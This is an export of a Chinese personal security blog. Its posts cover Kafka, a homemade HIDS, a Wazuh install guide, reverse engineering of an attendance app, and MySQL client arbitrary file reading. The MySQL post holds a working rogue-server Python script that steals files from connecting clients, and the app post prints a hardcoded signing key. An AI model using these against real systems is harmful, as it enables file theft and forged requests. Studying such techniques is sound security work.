{"meta":{"title":"Misaki's Blog","subtitle":null,"description":"One way to choose one","author":"Misaki","url":""},"pages":[{"title":"Me","date":"2018-09-18T03:14:22.000Z","updated":"2019-01-30T08:08:54.381Z","comments":true,"path":"about/index.html","permalink":"/about/index.html","excerpt":"","text":"关于我Web安全爱好者，python级菜鸟，移动安全进行中，喜欢一些新事物，成功性随机。"}],"posts":[{"title":"MySQL客户端任意文件读取","slug":"MySQL客户端任意文件读取","date":"2020-01-20T06:15:08.000Z","updated":"2020-01-20T06:15:08.138Z","comments":true,"path":"2020/01/MySQL客户端任意文件读取/","link":"","permalink":"/2020/01/MySQL客户端任意文件读取/","excerpt":"","text":"最早遇到这个问题的时候，大概是刚开始做安全的时候，那时候还没意识到利用等实际价值。18年的时候记得有一个CTF题，利用的就是扫描MySQL端口来获取读文件flag。直到今天看到一位大佬的拓展文章，打算实际的去利用实践一下。 https://lorexxar.cn/2020/01/14/css-mysql-chain LOAD DATA INFILELOAD DATA INFILE，作用是可以把文件读入到数据库的某个表里，如果在远程连接状态下使用了LOCAL关键字，即LOAD DATE LOCAL INFILE,那么就会从客户端读取一个本地文件，存入服务器端的table里。 如果执行load data infile &quot;C:/Windows/win.ini&quot; into table test FIELDS TERMINATED BY &#39;\\n&#39;;提示 受到secure_file_priv的导入导出限制。 但是使用load data local infile &quot;C:/Windows/win.ini&quot; into table test FIELDS TERMINATED BY &#39;\\n&#39;; 就会把客户端的文件读取到服务端，并且不再受到secure_file_priv的导入导出限制。 也就是说只要我们伪造一个服务端，让客户端主动连接过来，这样我们就可以任意读取系统上的文件等。 请求协议分析登陆先发送一个Greeting请求包，获取一些server信息。 接着会发送一个认证请求包，包含账号密码 后面会再接着发送一些查询请求，获取一些设置和编码信息等。 加载文件这时候我们点加载本地文件到test数据库中，会有三条相关的请求。第一条是发送查询语句 第二条是服务端返回了加载的文件地址给客户端 第三条就是客户端根据返回的地址读取文件，发送给服务端 所以这相当于一个客户端根据服务端的返回来读取文件请求给服务端的过程，也就是服务端是一直可信的。 而此处的利用就是，当服务端不可信的时候，利用返回来读取连接的客户端的信息文件。 那么，是不是只有在加载LOAD DATA LOCAL的时候才可以进行读取客户端文件，而别的时候不行呢。官方有一句这么解释，此处翻译为中文 意思是可以在任何语句中返回具有读取权限的文件。 受影响应用server端使用如下脚本： #coding=utf-8 import socket import logging logging.basicConfig(level=logging.DEBUG) filename=&quot;C:\\\\Windows\\\\win.ini&quot; sv=socket.socket() sv.bind((&quot;&quot;,3306)) sv.listen(5) conn,address=sv.accept() logging.info(&#39;Conn from: %r&#39;, address) conn.sendall(&quot;\\x4a\\x00\\x00\\x00\\x0a\\x35\\x2e\\x35\\x2e\\x35\\x33\\x00\\x17\\x00\\x00\\x00\\x6e\\x7a\\x3b\\x54\\x76\\x73\\x61\\x6a\\x00\\xff\\xf7\\x21\\x02\\x00\\x0f\\x80\\x15\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x70\\x76\\x21\\x3d\\x50\\x5c\\x5a\\x32\\x2a\\x7a\\x49\\x3f\\x00\\x6d\\x79\\x73\\x71\\x6c\\x5f\\x6e\\x61\\x74\\x69\\x76\\x65\\x5f\\x70\\x61\\x73\\x73\\x77\\x6f\\x72\\x64\\x00&quot;) conn.recv(9999) logging.info(&quot;auth okay&quot;) conn.sendall(&quot;\\x07\\x00\\x00\\x02\\x00\\x00\\x00\\x02\\x00\\x00\\x00&quot;) conn.recv(9999) logging.info(&quot;want file...&quot;) wantfile=chr(len(filename)+1)+&quot;\\x00\\x00\\x01\\xFB&quot;+filename conn.sendall(wantfile) content=conn.recv(9999) logging.info(content) conn.close() 利用Navicat Premium来连接，在配置中点击测试连接，就会有返回响应 python2的MySQLdb 不过在测试中发现python3的pymysql确不受影响 拓展利用在原文中，讲述了几种针对CMS的利用，那么就看一种针对dedecms的简单利用方式。 load data local infile &quot;D:\\\\phpstudy_pro\\\\WWW\\\\DedeCMS\\\\data\\\\common.inc.php&quot; into table dede_log FIELDS TERMINATED BY &#39;\\n&#39;; select * from dede_log; 使用dede默认的数据库的时候，连接信息被隐藏没有保存到数据。 先更改数据库 use test; load data local infile &quot;D:\\\\phpstudy_pro\\\\WWW\\\\DedeCMS\\\\data\\\\common.inc.php&quot; into table test.test FIELDS TERMINATED BY &#39;\\n&#39;; select * from test.test;","categories":[],"tags":[{"name":"渗透测试","slug":"渗透测试","permalink":"/tags/渗透测试/"}]},{"title":"Kafka","slug":"Kafka","date":"2020-01-14T08:05:55.000Z","updated":"2020-01-16T08:16:55.346Z","comments":true,"path":"2020/01/Kafka/","link":"","permalink":"/2020/01/Kafka/","excerpt":"","text":"Kafka 简介详情：http://kafka.apachecn.org/intro.html Kafka 使用简介这种网上很多的，此处不介绍了，可以查看以上ApacheCN的文档，就直接开始使用和python之间的整合。 下载当前的最新版本： wget http://archive.apache.org/dist/kafka/2.4.0/kafka_2.13-2.4.0.tgz 此处没有搭建zookeeper，就直接使用kafka的便捷脚本创建节点 ./bin/zookeeper-server-start.sh config/zookeeper.properties 如果出现错误Unrecognized VM option &#39;PrintGCDateStamps&#39;，可能是Java版本和Kafka版本之间的问题，尝试使用更高版本的Kafka或者其他版本的Java。 启动kafka，先复制一份需要的配置文件 cp config/server.properties config/server-1.properties 配置文件中 broker.id=0 #必须唯一，当前只设置一个，所以暂不更改 listeners=PLAINTEXT://:9092 #listeners是broker监听的地址和端口，多broker的时候需要不重复 log.dirs=/tmp/kafka-logs-1 #日志，此处改为kafka-logs-1 zookeeper.connect=localhost:2181 #zookeeper地址，没更改 启动kafka ./bin/kafka-server-start.sh config/server-1.properties 一串输出后，kafka启动成功 创建一个主题./bin/kafka-topics.sh --create --zookeeper localhost:2181 --replication-factor 1 --partitions 1 --topic test #创建test主题,replication-factor副本数，小于集群服务器数 ./bin/kafka-topics.sh --list --zookeeper localhost:2181 #查看当前主题 发送消息当在生产者发送消息的时候，消费者会显示消息 ./bin/kafka-console-consumer.sh --bootstrap-server localhost:9092 --topic test --from-beginning # 消费者监听，此时有生产者传入消息会显示 ./bin/kafka-console-producer.sh --broker-list localhost:9092 --topic test #生产者发送消息 多代理集群为每个代理创建一个配置文件 如上的复制配置文件 cp config/server.properties config/server-1.properties 修改配置文件参数 config/server-1.properties: broker.id=1 listeners=PLAINTEXT://:9093 log.dir=/tmp/kafka-logs-1 启动新节点 ./bin/kafka-server-start.sh config/server-1.properties &amp; 重新创建一个主题，然后通过生产者和消费者来处理消息，处理方式和上一样，只是需要更改不同的topic 导入/导出文件使用官方提高的三个配置文件，首先是Kafka Connect的配置文件，包含常用的配置，如Kafka brokers连接方式和数据的序列化格式。 其余的配置文件均指定一个要创建的连接器。这些文件包括连接器的唯一名称，类的实例，以及其他连接器所需的配置。 ./bin/connect-standalone.sh config/connect-standalone.properties config/connect-file-source.properties config/connect-file-sink.properties 一连串输出后，提示没有test.txt文件。 创建test.txt，就可以看到对文件的处理，文件夹下就会生成test.sink.txt。 使用python处理消息安装包 pip3 install kafka-python 使用文档 https://kafka-python.readthedocs.io/en/master/usage.html 生产者代码：from kafka import KafkaProducer from kafka.errors import KafkaError producer = KafkaProducer( bootstrap_servers=[ &quot;localhost:9092&quot; ] ) future = producer.send(&quot;test&quot;, b&#39;I am rito yan&#39;) try: record_metadata = future.get(timeout=10) print(record_metadata) except KafkaError as e: print(e) 发送成功后返回 RecordMetadata(topic=&#39;test&#39;, partition=0, topic_partition=TopicPartition(topic=&#39;test&#39;, partition=0), offset=3, timestamp=1578905897675, checksum=None, serialized_key_size=-1, serialized_value_size=13, serialized_header_size=-1) 也可以格式化消息格式 from kafka import KafkaProducer from kafka.errors import KafkaError producer = KafkaProducer( bootstrap_servers=[ &quot;localhost:9092&quot; ] #value_serializer=lambda m: json.dumps(m).encode(&#39;ascii&#39;) #生产者发送json数据 ) future = producer.send(&quot;test&quot;, b&#39;I am rito yan&#39;) #future = producer.send(&#39;test&#39;, {&#39;key&#39;: &#39;value&#39;}) try: record_metadata = future.get(timeout=10) print(record_metadata) except KafkaError as e: print(e) 消费者代码from kafka import KafkaConsumer consumer = KafkaConsumer( &quot;test&quot;, group_id = &quot;user-test&quot;, #群组id，消息只能被同组的一个消费者消费，所以需要定义组名 bootstrap_servers = [ &quot;localhost:9092&quot; ] #value_deserializer=lambda m: json.loads(m.decode(&#39;ascii&#39;)) #格式化解析格式 ) for message in consumer: print(&quot;%s:%d:%d: key=%s value=%s&quot; % (message.topic, message.partition, message.offset, message.key, message.value)) 消费这运行后处于监听状态，当运行如上的生产者代码的时候，界面会显示出生产者的消息 项目中引用kafka在实现过程中，消费者处于监听状态，但是项目运行时，阻塞性的监听并不可用，可以使用多线程或者其他方式来处理。 def search_area(): prints = PrintThread() prints.setDaemon(True) prints.start() for i in range(100,200): time.sleep(1) print(i) import threading import time from kafka import KafkaConsumer class PrintThread(threading.Thread): def run(self): print(&quot;start.... %s&quot; %self.getName()) consumer = KafkaConsumer( &quot;test&quot;, group_id = &quot;user-test&quot;, #群组id，消息只能被同组的一个消费者消费，所以需要定义组名 bootstrap_servers = [ &quot;localhost:9092&quot; ] #value_deserializer=lambda m: json.loads(m.decode(&#39;ascii&#39;)) #格式化解析格式 ) for message in consumer: print(&quot;%s:%d:%d: key=%s value=%s&quot; % (message.topic, message.partition, message.offset, message.key, message.value)) search_area() 达到主线程不阻塞的情况下仍然可以继续监听 或者不采用监听的方式，采用主动拉取队列数据，这样一次拉取的时候可能是较大的数据，对数据量处理要求高的情况下可能会增加消息延迟堆积 from kafka import KafkaConsumer consumer = KafkaConsumer( &quot;test&quot;, group_id=&#39;user-test&#39;, bootstrap_servers = [ &quot;localhost:9092&quot; ] ) consumer.subscribe(topics=(&#39;test&#39;,)) # consumer.subscribe(topics=(&#39;test&#39;,&#39;test0&#39;)) #订阅多个主题 msg = consumer.poll(timeout_ms=2000) # 从kafka获取消息 print(msg) for tp, messages in msg.items(): for message in messages: print(&quot;%s:%d:%d: key=%s value=%s&quot; % (tp.topic, tp.partition, message.offset, message.key, message.value)) 但是这样做会出现多次获取重复已消费的信息，因为自动位移提交的动作是在 poll() 方法的逻辑里完成的，在每次真正向服务端发起拉取请求之前会检查是否可以进行位移提交，如果可以，那么就会提交上一次轮询的位移。单次请求的时候不能提交offset。 添加如下手动提交已消费信息 from kafka import KafkaConsumer consumer = KafkaConsumer( &quot;test&quot;, group_id=&#39;user-test&#39;, enable_auto_commit = False, bootstrap_servers = [ &quot;localhost:9092&quot; ] ) consumer.subscribe(topics=(&#39;test&#39;,)) # consumer.subscribe(topics=(&#39;test&#39;,&#39;test0&#39;)) #订阅多个主题 msg = consumer.poll(timeout_ms=2000) # 从kafka获取消息 print(msg) for tp, messages in msg.items(): for message in messages: print(&quot;%s:%d:%d: key=%s value=%s&quot; % (tp.topic, tp.partition, message.offset, message.key, message.value)) consumer.commit() #同步提交，直到正常或异常返回之前阻塞 consumer.commit_async() #异步提交，不阻塞 读取已消费信息 使用 seek方法从指定的partition和offset开始读取数据，需要记录分区和offset。 #encoding:utf8 from kafka import KafkaConsumer, TopicPartition my_topic = &quot;my.topic&quot; # 指定需要消费的主题 consumer = KafkaConsumer( bootstrap_servers = &quot;192.168.70.221:19092,192.168.70.222:19092,192.168.70.223:19092&quot;, # kafka集群地址 group_id = &quot;my.group&quot;, # 消费组id enable_auto_commit = True, # 每过一段时间自动提交所有已消费的消息（在迭代时提交） auto_commit_interval_ms = 5000, # 自动提交的周期（毫秒） ) consumer.assign([ TopicPartition(topic=my_topic, partition=0), TopicPartition(topic=my_topic, partition=1), TopicPartition(topic=my_topic, partition=2) ]) consumer.seek(TopicPartition(topic=my_topic, partition=0), 12) # 指定起始offset为12 consumer.seek(TopicPartition(topic=my_topic, partition=1), 0) # 可以注册多个分区，此分区从第一条消息开始接收 # consumer.seek(TopicPartition(topic=my_topic, partition=2), 32) # 没有注册的分区上的消息不会被消费 for msg in consumer: # 迭代器，等待下一条消息 print msg # 打印消息 部署kafka配置好需要的参数后 ./bin/zookeeper-server-start.sh -daemon config/zookeeper.properties 就可以看到zookeeper处于监听状态，当然zookeeper这个一般使用集群部署的节点，此处仍然是使用kafka。 ./bin/kafka-server-start.sh -daemon config/server-1.properties","categories":[],"tags":[{"name":"Open Source Security","slug":"Open-Source-Security","permalink":"/tags/Open-Source-Security/"}]},{"title":"中小型企业自研HIDS简单实现","slug":"中小型企业自研HIDS简单实现","date":"2020-01-10T03:51:09.000Z","updated":"2020-01-10T04:40:12.100Z","comments":true,"path":"2020/01/中小型企业自研HIDS简单实现/","link":"","permalink":"/2020/01/中小型企业自研HIDS简单实现/","excerpt":"","text":"此HIDS自研面对中小型企业，一般服务器百级。如果对集群部署，系统获取更加完善灵活，服务量级较高可以参考： 驭龙 美团 点融 Wazuh 架构架构采用，一般中小型企业安全人员较少，重视度远不如大型企业，多见“一个人的安全部”。架构不适宜过于复杂，后端开发可以根据实际采用python，go，Java等。web框架，有django，php都可以使用。消息的被动或者主动获取又涉及到是否需要使用ES或者ActiveMQ。这一点后面再讨论。此处使用平安集团分享的一个预警结构流程。 Agentagent的建设是整个流程中最费劲的事情了。需要以下几种特点 可维护性高，获取信息稳定 对系统侵入小，适合多种系统的多版本内核 通道信息安全，进程可维护 支持灵活检测，负载小 便于一键化部署 对于互联网大厂采用的方案多是hook，audit等。hook的侵入性比较高，在没有专门的定制化开发下，中小型企业使用的成本比较高，之前在试图部署驭龙的时候就发现太容易对系统造成崩溃。这是生产系统不能接受的。 如何选择侵入小，兼容高，信息全，成本低就是主要考虑了。 对文件监控上比较好的开源监控也就是aide和inotify-tools。aide是对文件的hash比较来判断文件的改动，无实时性。inotify是实时监控，倾向于此。在实际系统测试上，对各个Linux的发行版兼容性也可以满足需求。 其他信息的获取上，倾向于python库psutil。这是Linux的运维的第三方模块。可以收集很多Linux系统的信息，进程，网络，用户，内存等。可以跟主机做实时的信息获取。而且实现简单，方便跟inotify做联动。 信息推送上，如果考虑实时性，可以使用agent主动推送的信息实现方案，但这样做会面临多服务的压力，延迟，丢失。所以需要对信息做消息处理，就需要消息队列。采用何种方式根据需求选择。 agent被动提供消息，只需要把获取的信息提交到某个特定的地址。比如，此处使用类似ES的信息提供方式，agent获取信息后交给flask以json来展示，server对agent来做守护任务来被动获取。这样，实时性较低，需要对获取的信息做过滤处理。但消息获取上比较稳定。 Serverserver端主要做信息的展示和处理整合，此处直接使用python-django。如果使用被动获取信息，需要server做定时任务，采用任务框架APScheduler来管理定时任务。 简而言之，实现方便，操作简单。server端还真是没有多少值得谈论。 功能虽然名为HIDS，但还是需要一些其他功能，只是agent传输的文件监控和主机的信息仿佛作用较低。而且在监控中可以看到，当服务文件改动较多的时候，提示的预警信息过于频繁。分析较为困难。所以为了便于发现其中存在的问题，使用文件扫描功能，比如Linux下的河马webshell扫描。调用扫描来对预警文件进行判断，但扫描识别率测试中，只有百分之六十到七十左右。识别率是否能接受就看个人情况拉。 同时，对于感染型后门，我增加了一个对威胁信息的检测。从以下地址获取感染IP： http://osint.bambenekconsulting.com https://feodotracker.abuse.ch 通过网络连接来判断是否有类似的感染发生，对于IP的获取同样使用定时任务。 web日志目前想通过web日志的方式来做检测告警，比如，大量文件的变更时，跟web日志做查询，来判断是否是一个外部创建的文件。通过ES日志服务器来整合，但在实现中发现，不一定创建成功的文件就一定在日志中，就像文件重命名。所以此功能具体的实现还有待考究。 如果后期可以发现一种webshell识别较高的情况，可以使用扫描价web日志联合告警的方式来减少预警的情况下，提高准确度。 由于使用上没有采用agent主动推送，没用参考消息队列，后期准备改为推送和消息队列形式，同时增加对文件检测的识别和减少告警。同时希望agent的信息获取可以使用audit的方式。 以下是代码实现，简单到会django就可以做二次修改哦 zeru","categories":[],"tags":[{"name":"Open Source Security","slug":"Open-Source-Security","permalink":"/tags/Open-Source-Security/"}]},{"title":"逆向打卡APP","slug":"逆向打卡APP","date":"2019-12-28T14:57:04.000Z","updated":"2019-12-28T14:57:06.000Z","comments":true,"path":"2019/12/逆向打卡APP/","link":"","permalink":"/2019/12/逆向打卡APP/","excerpt":"","text":"公司打卡APP，由于偶尔忘记打卡，所以想做一个能查询是否打卡来提醒自己的脚本，为什么不做自动打卡脚本，担心万一更新出问题，但没有发现，那岂不是很尴尬。 首先抓包，查看查询打卡的请求。 获取其中的参数，其中userid为手机号，rmk3为设备uid，reqssn为固定字符串，所以需要知道加密算法来计算sign fm=&lt;fm&gt;&lt;userid&gt;178xxxx&lt;/userid&gt;&lt;ver&gt;3.2.0&lt;/ver&gt;&lt;rmk1/&gt;&lt;rmk2&gt;2&lt;/rmk2&gt;&lt;rmk3&gt;8xxxx-xxxx-xxxx-xxxx-BCxxxxxxxx71&lt;/rmk3&gt;&lt;action&gt;attendRecord&lt;/action&gt;&lt;reqssn&gt;2244f70148454d03baeb739d9c86e082&lt;/reqssn&gt;&lt;sign&gt;54bexxxxxx&lt;/sign&gt;&lt;/fm&gt; 按照惯例，解包后搜索参数名，找到一个sign函数，查看后发现是加密函数，其中部分代码如下，或者uuid，拼接参数 其中有个私钥，记录一下 PRIVATE_KEY = &quot;6fcb5584c28743b8ff16337353b0cabe&quot; 继续查看，就可以看到后面还拼接了reqssn，然后通过和私钥的拼接组成新的字符串做一个sha256加密。所以，这个reqssn参数是哪里来的呢，是否是固定值。搜索查看 在其他函数位置发现，reqssn的值，是固定值，且写入代码中。后面的就是上面所说的sign函数。 至于uuid是怎么发现，继续查看相关的代码引用，发现是利用本地读取的文件，打开测试机，找到如下位置，发现保存的uuid 理论上至此，参数值和加密已经得知，但是经过计算还是不一样，继续查看调用的加密，发现其中做了一次base64的编码，然后再sha256加密。 至此能算出加密值和抓包到的结果一致。 如果仔细想想，这个请求中貌似没有变化的量那岂不是只需要做这个请求就可以，干嘛需要加密算法呢。这个请求中没有变化的值，但是登陆中有啊，其中的reqssn就不再是固定值，而是一个当前的时间戳，这时候就需要算法来生成sign。总不能cookie失效一次就抓一次包改一次cookie吧。 登陆的时候参数就是 &lt;fm&gt;&lt;pwd&gt;cxxxxxxxx0b33xxxxxxxxxxxxxx&lt;/pwd&gt;&lt;userid&gt;17xxxxxxx&lt;/userid&gt;&lt;ver&gt;3.2.0&lt;/ver&gt;&lt;rmk1/&gt;&lt;rmk2&gt;2&lt;/rmk2&gt;&lt;rmk3&gt;ffxxxxxx-xxxx-xxxx-xxxx-xxxxxxx9b&lt;/rmk3&gt;&lt;action&gt;login&lt;/action&gt;&lt;reqssn&gt;20191225122352145&lt;/reqssn&gt;&lt;/fm&gt;","categories":[],"tags":[{"name":"Android逆向","slug":"Android逆向","permalink":"/tags/Android逆向/"}]},{"title":"OSSEC Wazuh","slug":"OSSEC-Wazuh","date":"2019-12-06T05:47:30.000Z","updated":"2019-12-06T05:47:30.353Z","comments":true,"path":"2019/12/OSSEC-Wazuh/","link":"","permalink":"/2019/12/OSSEC-Wazuh/","excerpt":"","text":"安装Wazuh manager使用Ubuntu系统，目前wazuh版本为3.10 安装文档地址：https://documentation.wazuh.com/3.10/installation-guide/installing-elastic-stack/elastic_server_deb.html 添加更新源apt-get update apt-get install curl apt-transport-https lsb-release #需要python2.7以上 curl -s https://packages.wazuh.com/key/GPG-KEY-WAZUH | apt-key add - #添加更新源 echo &quot;deb https://packages.wazuh.com/3.x/apt/ stable main&quot; | tee -a /etc/apt/sources.list.d/wazuh.list #更新包 apt-get update 安装Wazuh Managerapt-get install wazuh-manager service wazuh-manager status #检查运行状态 安装Wazuh API如果不能直接安装nodejs需要添加更新源安装 curl -sL https://deb.nodesource.com/setup_8.x | bash - apt-get install nodejs apt-get install wazuh-api service wazuh-api status #检查运行状态 sed -i &quot;s/^deb/#deb/&quot; /etc/apt/sources.list.d/wazuh.list #禁用Wazuh更新源 apt-get update 配置API用户信息，启用HTTPS，可以使用脚本生成证书或者自动生成证书，以下自动生成证书，同时还可以修改访问API的用户，默认用户密码是foo和bar。如需要修改记得重启服务。 # 配置端口账户等信息 cd /var/ossec/api/scripts ./configure_api.sh #不使用脚本修改 cd /var/ossec/api/configuration/auth node htpasswd -Bc -C 10 user myUserName 安装FilebeatFilebeat是Wazuh服务器上的工具，可以将警报和归档事件安全地转发到Elastic Stack服务器上的Logstash服务。 添加源存储库和密钥： apt-get install curl apt-transport-https curl -s https://artifacts.elastic.co/GPG-KEY-elasticsearch | apt-key add - echo &quot;deb https://artifacts.elastic.co/packages/7.x/apt stable main&quot; | tee /etc/apt/sources.list.d/elastic-7.x.list apt-get update 安装 apt-get install filebeat=7.4.2 从Wazuh存储库下载Filebeat配置文件。这是预先配置的，用于将Wazuh警报转发到Elasticsearch： curl -so /etc/filebeat/filebeat.yml https://raw.githubusercontent.com/wazuh/wazuh/v3.10.2/extensions/filebeat/7.x/filebeat.yml 下载Elasticsearch的警报模板： curl -so /etc/filebeat/wazuh-template.json https://raw.githubusercontent.com/wazuh/wazuh/v3.10.2/extensions/elasticsearch/7.x/wazuh-template.json 下载适用于Filebeat的Wazuh模块： curl -s https://packages.wazuh.com/3.x/filebeat/wazuh-filebeat-0.1.tar.gz | sudo tar -xvz -C /usr/share/filebeat/module 编辑文件，/etc/filebeat/filebeat.yml并用YOUR_ELASTIC_SERVER_IPElasticsearch服务器的IP地址或主机名替换。例如： output.elasticsearch: hosts: [&quot;192.168.120.128:9200&quot;] 启用并启动Filebeat服务： systemctl daemon-reload systemctl enable filebeat.service systemctl start filebeat.service 安装Elastic Stack添加弹性存储库及其GPG密钥： apt-get install curl apt-transport-https curl -s https://artifacts.elastic.co/GPG-KEY-elasticsearch | apt-key add - echo &quot;deb https://artifacts.elastic.co/packages/7.x/apt stable main&quot; | tee /etc/apt/sources.list.d/elastic-7.x.list apt-get update 安装Elasticsearch软件包： apt-get install elasticsearch=7.4.2 需要Java环境，例如安装openjdk apt install openjdk-11-jre-headless 此处网速影响，挂VPS下载软件包解压使用。 如果使用源安装编辑文件/etc/elasticsearch/elasticsearch.yml并取消注释设置，将Elasticsearch配置为侦听非回送地址network.host。将值更改为要绑定到的IP： network.host: &lt;elasticsearch_ip&gt; 更改network.host选项后，需要进一步配置。在文件中添加或编辑（如果有注释）以下几行/etc/elasticsearch/elasticsearch.yml： node.name: &lt;node_name&gt; cluster.initial_master_nodes: [&quot;&lt;node_name&gt;&quot;] 如果使用下载文件包启动方式，编辑文件elasticsearch/config/elasticsearch.yml来执行如上操作。 修改完成后启动ES。 systemctl daemon-reload systemctl enable elasticsearch.service systemctl start elasticsearch.service 文件启动的话，需要非root用户启动 检查启动是否正常 curl http://192.168.120.128:9200 安装Kibana源安装 apt-get install kibana=7.4.2 安装适用于Kibana的Wazuh应用程序插件： 从URL安装： sudo -u kibana /usr/share/kibana/bin/kibana-plugin install https://packages.wazuh.com/wazuhapp/wazuhapp-3.10.2_7.4.2.zip 从软件包安装： sudo -u kibana /usr/share/kibana/bin/kibana-plugin install file:///path/wazuhapp-3.10.2_7.4.2.zip 编辑文件/etc/kibana/kibana.yml，修改设置server.host server.host: &quot;192.168.120.128&quot; //修改为主机地址 elasticsearch.hosts: [&quot;http://192.168.120.128:9200&quot;] //修改为es的主机地址，此处使用同一台主机 启用并启动Kibana服务： systemctl daemon-reload systemctl enable kibana.service systemctl start kibana.service 禁用Elasticsearch更新： sed -i &quot;s/^deb/#deb/&quot; /etc/apt/sources.list.d/elastic-7.x.list apt-get update 如果出现Kibana server is not ready yet问题，可能是kibana和es的版本不一致，尝试修改为同一版本，或者是elasticsearch.hosts没有修改为主机的IP，尝试修改为主机IP，再或者是还没刷新成功，等待一会。 选择小狐狸头像，配置API认证，如果修改了则填入设置的账号密码。 下载模版文件 # 下载filebeat配置文件 curl -so /etc/filebeat/filebeat.yml https://raw.githubusercontent.com/wazuh/wazuh/v3.9.2/extensions/filebeat/7.x/filebeat.yml chmod go+r /etc/filebeat/filebeat.yml # 下载elasticsearch的模版文件 curl -so /etc/filebeat/wazuh-template.json https://raw.githubusercontent.com/wazuh/wazuh/v3.9.2/extensions/elasticsearch/7.x/wazuh-template.json chmod go+r /etc/filebeat/wazuh-template.json 配置Filebeat output.elasticsearch: hosts: [&#39;http://YOUR_ELASTIC_SERVER_IP:9200&#39;] # 修改为 output.elasticsearch: hosts: [&#39;http://192.168.120.128:9200&#39;] 安装Wazuh agent以上安装可以在一台服务器中，此处agent则需要在需要监控的主机上安装，把agent安装到kali机中。 添加存储库 apt-get install curl apt-transport-https lsb-release gnupg2 安装Wazuh存储库GPG密钥： curl -s https://packages.wazuh.com/key/GPG-KEY-WAZUH | apt-key add - 添加存储库： echo &quot;deb https://packages.wazuh.com/3.x/apt/ stable main&quot; | tee /etc/apt/sources.list.d/wazuh.list 更新软件包 apt-get update 使用如下安装还需要配置注册，可以手动注册或者脚本注册 apt-get install wazuh-agent https://github.com/wazuh/wazuh-api/blob/master/examples/api-register-agent.sh 使用如下安装和部署，需要携带定义的变量，变量说明列表 https://documentation.wazuh.com/3.10/user-manual/registering/index.html#register-agents WAZUH_MANAGER=&quot;192.168.120.128&quot; apt-get install wazuh-agent //wazuh-api地址,多个服务使用逗号分隔 或者下载软件包安装，使用脚本注册 https://packages.wazuh.com/3.x/apt/pool/main/w/wazuh-agent/wazuh-agent_3.10.2-1_amd64.deb #!/bin/bash ### # Shell script for registering agents automatically with the API # Copyright (C) 2017 Wazuh, Inc. All rights reserved. # Wazuh.com # # This program is a free software; you can redistribute it # and/or modify it under the terms of the GNU General Public # License (version 2) as published by the FSF - Free Software # Foundation. ### # Connection variables API_IP=&quot;192.168.120.128&quot; #wazuh-api 地址 API_PORT=&quot;55000&quot; PROTOCOL=&quot;http&quot; USER=&quot;qweasd&quot; PASSWORD=&quot;qweasd&quot; display_help() { cat &lt;&lt;HELP_USAGE $0 [-h] [-f|--force] [-q|--quiet] [agent] -h Show this message. -f|--force Force agent removal (if already registered) The agent will be re-regitered with a new ID -s|--silent Surpress the output while removing the agent agent Agent name (if missing we will use the output of the hostname command) HELP_USAGE } register_agent() { # Adding agent and getting Id from manager echo &quot;&quot; echo &quot;Adding agent:&quot; echo &quot;curl -s -u $USER:**** -k -X POST -d &#39;name=$AGENT_NAME&#39; $PROTOCOL://$API_IP:$API_PORT/agents&quot; API_RESULT=$(curl -s -u $USER:&quot;$PASSWORD&quot; -k -X POST -d &#39;name=&#39;$AGENT_NAME $PROTOCOL://$API_IP:$API_PORT/agents) echo -e $API_RESULT | grep -q &quot;\\&quot;error\\&quot;:0&quot; 2&gt;&amp;1 if [ &quot;$?&quot; != &quot;0&quot; ]; then echo -e $API_RESULT | sed -rn &#39;s/.*&quot;message&quot;:&quot;(.+)&quot;.*/\\1/p&#39; exit 1 fi # Get agent id and agent key AGENT_ID=$(echo $API_RESULT | cut -d&#39;:&#39; -f 4 | cut -d &#39;,&#39; -f 1) AGENT_KEY=$(echo $API_RESULT | cut -d&#39;:&#39; -f 5 | cut -d &#39;}&#39; -f 1) echo &quot;Agent &#39;$AGENT_NAME&#39; with ID &#39;$AGENT_ID&#39; added.&quot; echo &quot;Key for agent &#39;$AGENT_ID&#39; received.&quot; # Importing key echo &quot;&quot; echo &quot;Importing authentication key:&quot; echo &quot;y&quot; | /var/ossec/bin/manage_agents -i $AGENT_KEY # Restarting agent echo &quot;&quot; echo &quot;Restarting:&quot; echo &quot;&quot; /var/ossec/bin/ossec-control restart exit 0 } remove_agent() { echo &quot;Found: $AGENT_ID&quot; echo &quot;Removing previous registration for &#39;$AGENT_NAME&#39; using ID: $AGENT_ID ...&quot; # curl -u foo:bar -k -X DELETE &quot;https://127.0.0.1:55000/agents/001 REMOVE_AGENT=$(curl -s -u $USER:&quot;$PASSWORD&quot; -k -X DELETE $PROTOCOL://$API_IP:$API_PORT/agents/$AGENT_ID) echo -e $REMOVE_AGENT } get_agent_id() { echo &quot;&quot; echo &quot;Checking for Agent ID...&quot; AGENT_ID=$(curl -s -u $USER:&quot;$PASSWORD&quot; -k -X GET $PROTOCOL://$API_IP:$API_PORT/agents/name/$AGENT_NAME | rev | cut -d: -f1 | rev | grep -o &#39;&quot;.*&quot;&#39; | tr -d &#39;&quot;&#39;) } # MAIN # ENTRY POINT while getopts &#39;:hfs&#39; OPTION; do case &quot;$OPTION&quot; in h) display_help exit 0 ;; f|--force) FORCE=true ;; s|--silent) SILENT=true ;; esac done # reset $1, $2 .... as normal argument after the flag shift $(($OPTIND - 1)) # if no arguments are passed in after the flags, we assign the hostname value to the AGENT_NAME AGENT_NAME=${1:-$(hostname)} get_agent_id # check the return value. If we get an integer back then the agent is already registered. Anything else -&gt; agent is not registered if ! [ &quot;$AGENT_ID&quot; -eq &quot;$AGENT_ID&quot; ] 2&gt; /dev/null ; then echo &quot;Starting registration process ...&quot; : elif [[ &quot;$FORCE&quot; = true &amp;&amp; &quot;$SILENT&quot; = &quot;true&quot; ]] ; then remove_agent &gt; /dev/null 2&gt;&amp;1 else if [[ &quot;$FORCE&quot; = true ]] ; then remove_agent fi fi # Default action -&gt; try to register the agent register_agent 配置好后，访问wazuh界面中的agent就可以看到连接状态了 在Inventory data中可以看到主机的网卡，网络连接，软件包等信息。 配置文件 /var/ossec/etc/ossec.conf文件完成性监控，同时需要修改server端的获取时间和配置 &lt;frequency&gt;43200&lt;/frequency&gt; #默认为十二小时，此处修改为100秒 &lt;!-- File integrity monitoring --&gt; &lt;syscheck&gt; &lt;disabled&gt;no&lt;/disabled&gt; #文件完整性监控，默认为no &lt;syscheck&gt; &lt;directories check_all=&quot;yes&quot; realtime=&quot;yes&quot;&gt;/tmp&lt;/directories&gt; #实时扫描，仅使用目录 &lt;/syscheck&gt; &lt;syscheck&gt; &lt;frequency&gt;36000&lt;/frequency&gt; #计划扫描，每十小时一次 